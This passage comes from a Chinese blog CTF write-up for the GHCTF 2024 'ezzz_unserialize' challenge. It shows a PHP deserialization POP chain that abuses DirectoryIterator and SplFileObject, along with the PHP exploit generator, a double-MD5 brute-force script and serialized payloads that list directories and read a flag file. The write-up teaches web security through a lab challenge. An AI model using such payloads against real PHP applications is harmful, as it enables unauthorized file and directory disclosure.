+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;/CTF/网络安全学习笔记/漏洞&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 __toString() 方法，输出指定目录里面经过排序之后的第一个文件名：</p>
+</blockquote>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/z-unserialize/image-20251216141029570.png" srcset="/img/loading.gif" lazyload alt="image-20251216141029570"></p>
+<p>如果想输出全部的文件名我们还需要对<code>$dir</code>对象进行遍历：</p>
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/z-unserialize/image-20251216140735541.png" srcset="/img/loading.gif" lazyload alt="image-20251216140735541"></p>
+<p>这不就和回调函数中的代码一样嘛，所以这里就可以利用原生类来进行目录遍历，查看有哪些目录和文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">array_walk</span>(<span class="hljs-variable">$this</span>, function(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$a</span>);<br>            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$c</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$d</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$d</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-built_in">DirectoryIterator</span> = <span class="hljs-string">&#x27;/CTF/网络安全学习笔记/漏洞&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;non_existent;<br><span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/z-unserialize/image-20251216141633854.png" srcset="/img/loading.gif" lazyload alt="image-20251216141633854"></p>
+<p>除此之外还有可以读文件的原生类<code>SplFileObject</code>，也是一样，直接<code>echo</code>只会输出一行的内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/CTF/网络安全学习笔记/漏洞/PHP反序列化/PHP原生类/题目/[GHCTF 2024 新生赛]ezzz_unserialize/test.php&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/z-unserialize/image-20251216142041377.png" srcset="/img/loading.gif" lazyload alt="image-20251216142041377"></p>
+<p>所以也要利用<code>foreach</code>进行循环遍历</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/CTF/网络安全学习笔记/漏洞/PHP反序列化/PHP原生类/题目/[GHCTF 2024 新生赛]ezzz_unserialize/test.php&#x27;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$content</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$c</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/z-unserialize/image-20251216142227247.png" srcset="/img/loading.gif" lazyload alt="image-20251216142227247"></p>
+<p>所以最后一步的EXP就知道怎么构造了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$E</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">E</span>();<br><span class="hljs-variable">$E</span>-&gt;<span class="hljs-built_in">DirectoryIterator</span> = <span class="hljs-string">&quot;/&quot;</span>;<br><span class="hljs-comment">// $E-&gt;SplFileObject = &quot;/1_ffffffflllllagggggg&quot;;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后就是往前找构造链子了，要触发<code>__get()</code>魔术方法的地方，就是调用不存在的成员属性，就是在<code>Heraclqs</code>类中的<code>return $this -&gt; grape -&gt; hey; </code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Heraclqs</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$grape</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blueberry</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span> -&gt; blueberry)) == <span class="hljs-number">123</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span> -&gt; grape -&gt; hey;<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure>
+
+<p>这里要找到一个经过双重MD5加密后是<code>123</code>开头的字符串</p>
+<blockquote>
+<p>借鉴一下脚本：<a target="_blank" rel="noopener" href="https://blog.csdn.net/liaochonxiang/article/details/140361138">https://blog.csdn.net/liaochonxiang/article/details/140361138</a></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.product(string.printable, repeat=<span class="hljs-number">3</span>):<br>    s = <span class="hljs-string">&#x27;&#x27;</span>.join(i)<br>    s1 = hashlib.md5(s.encode()).hexdigest()<br>    s2 = hashlib.md5(s1.encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> s2[:<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;123&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(s)<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/z-unserialize/image-20251216144024126.png" srcset="/img/loading.gif" lazyload alt="image-20251216144024126"></p>
+<p>所以这部分的EXP可以写成</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$Heraclqs</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Heraclqs</span>();<br><span class="hljs-variable">$Heraclqs</span>-&gt;blueberry = <span class="hljs-string">&quot;1xE&quot;</span>;<br><span class="hljs-variable">$Heraclqs</span>-&gt;grape = <span class="hljs-variable">$E</span>;<br></code></pre></td></tr></table></figure>
+
+<p>然后继续找触发<code>__invoke</code>的地方，就是以调用函数的方式调用一个对象，在<code>Sakura</code>类的<code>__toString</code>方法中，并且这个类的<code>__destruct</code>里的内容可以触发<code>__toString</code>魔术方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sakura</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$apple</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$strawberry</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; apple = <span class="hljs-variable">$a</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span> -&gt; apple;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$new</span> = <span class="hljs-variable language_">$this</span> -&gt; strawberry;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$new</span>();<br>    &#125;<br><br>&#125; <br></code></pre></td></tr></table></figure>
+
+<p>这就是 POP 链的开头了，注意这里的<code>apple</code>要实例化的对象是<code>Sakura</code>类才会触发这个类的<code>__toString</code>，EXP：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$Sakura</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sakura</span>();<br><span class="hljs-variable">$Sakura</span>-&gt;apple = <span class="hljs-variable">$Sakura</span>;<br><span class="hljs-variable">$Sakura</span>-&gt;strawberry = <span class="hljs-variable">$Heraclqs</span>;<br></code></pre></td></tr></table></figure>
+
+<p>总结起来完整的EXP就是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sakura</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$apple</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$strawberry</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$e</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Heraclqs</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$grape</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blueberry</span>;<br>&#125;<br><br><span class="hljs-variable">$E</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">E</span>();<br><span class="hljs-variable">$E</span>-&gt;<span class="hljs-built_in">DirectoryIterator</span> = <span class="hljs-string">&quot;/&quot;</span>;<br><span class="hljs-comment">//$E-&gt;SplFileObject = &quot;/1_ffffffflllllagggggg&quot;;</span><br><br><span class="hljs-variable">$Heraclqs</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Heraclqs</span>();<br><span class="hljs-variable">$Heraclqs</span>-&gt;blueberry = <span class="hljs-string">&quot;1xE&quot;</span>;<br><span class="hljs-variable">$Heraclqs</span>-&gt;grape = <span class="hljs-variable">$E</span>;<br><br><span class="hljs-variable">$Sakura</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sakura</span>();<br><span class="hljs-variable">$Sakura</span>-&gt;apple = <span class="hljs-variable">$Sakura</span>;<br><span class="hljs-variable">$Sakura</span>-&gt;strawberry = <span class="hljs-variable">$Heraclqs</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$Sakura</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Sakura&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;apple&quot;</span>;r:<span class="hljs-number">1</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;strawberry&quot;</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;Heraclqs&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;grape&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;E&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;e&quot;</span>;N;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;DirectoryIterator&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;/&quot;</span>;&#125;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;blueberry&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;1xE&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/z-unserialize/image-20251216145308407.png" srcset="/img/loading.gif" lazyload alt="image-20251216145308407"></p>
+<p>然后用<code>SplFileObject</code>类读文件内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sakura</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$apple</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$strawberry</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$e</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Heraclqs</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$grape</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blueberry</span>;<br>&#125;<br><br><span class="hljs-variable">$E</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">E</span>();<br><span class="hljs-comment">//$E-&gt;DirectoryIterator = &quot;/&quot;;</span><br><span class="hljs-variable">$E</span>-&gt;<span class="hljs-built_in">SplFileObject</span> = <span class="hljs-string">&quot;/1_ffffffflllllagggggg&quot;</span>;<br><br><span class="hljs-variable">$Heraclqs</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Heraclqs</span>();<br><span class="hljs-variable">$Heraclqs</span>-&gt;blueberry = <span class="hljs-string">&quot;1xE&quot;</span>;<br><span class="hljs-variable">$Heraclqs</span>-&gt;grape = <span class="hljs-variable">$E</span>;<br><br><span class="hljs-variable">$Sakura</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sakura</span>();<br><span class="hljs-variable">$Sakura</span>-&gt;apple = <span class="hljs-variable">$Sakura</span>;<br><span class="hljs-variable">$Sakura</span>-&gt;strawberry = <span class="hljs-variable">$Heraclqs</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$Sakura</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Sakura&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;apple&quot;</span>;r:<span class="hljs-number">1</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;strawberry&quot;</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;Heraclqs&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;grape&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;E&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;e&quot;</span>;N;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;SplFileObject&quot;</span>;s:<span class="hljs-number">22</span>:<span class="hljs-string">&quot;/1_ffffffflllllagggggg&quot;</span>;&#125;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;blueberry&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;1xE&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/12/0xGame2025-WEB-WP/z-unserialize/image-20251216145920898.png" srcset="/img/loading.gif" lazyload alt="image-20251216145920898"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/" class="category-chain-item">漏洞笔记</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="category-chain-item">PHP反序列化</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/" class="category-chain-item">PHP原生类</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/%E9%A2%98%E7%9B%AE/" class="category-chain-item">题目</a>
+  
+  
+
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/" class="print-no-link">#PHP原生类</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>[GHCTF 2024 新生赛]ezzz_unserialize</div>
+      <div>https://yschen20.github.io/2025/12/16/GHCTF-2024-新生赛-ezzz-unserialize/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Suzen</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年12月16日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年12月16日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/12/14/%E5%9C%A8IDEA%E4%BD%BF%E7%94%A8CTF%E4%B8%ADJava%E9%A2%98%E7%9A%84jar%E5%8C%85/" title="在IDEA使用CTF中Java题的jar包">
+                        <span class="hidden-mobile">在IDEA使用CTF中Java题的jar包</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://imagegoo-twikoo.hf.space","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              Fluid.utils.listenDOMLoaded(function() {
+                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+                Fluid.plugins.imageCaption(imgSelector);
+                Fluid.plugins.fancyBox(imgSelector);
+              });
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+    <div>
+        <span id="timeDate">正在载入天数...</span>
+        <span id="times">载入时分秒...</span>
+        <script>
+          var now = new Date();
+          function createtime(){
+            var grt= new Date("04/25/2025 00:00:00");
+            now.setTime(now.getTime()+250);
+            days = (now - grt ) / 1000 / 60 / 60 / 24;
+            dnum = Math.floor(days);
+            hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+            hnum = Math.floor(hours);
+            if(String(hnum).length ==1 ){
+              hnum = "0" + hnum;
+            }
+            minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+            mnum = Math.floor(minutes);
+            if(String(mnum).length ==1 ){
+              mnum = "0" + mnum;
+            }
+            seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+            snum = Math.round(seconds);
+            if(String(snum).length ==1 ){
+              snum = "0" + snum;
+            }
+            document.getElementById("timeDate").innerHTML = "🚀已持续航行&nbsp"+dnum+"&nbsp天";
+            document.getElementById("times").innerHTML = hnum + "&nbsp时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+          }
+          setInterval("createtime()",250);
+        </script>
+    </div>
+
+
+
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  var relativeDate = function() {
+    var updatedTime = document.getElementById('updated-time');
+    if (updatedTime) {
+      var text = updatedTime.textContent;
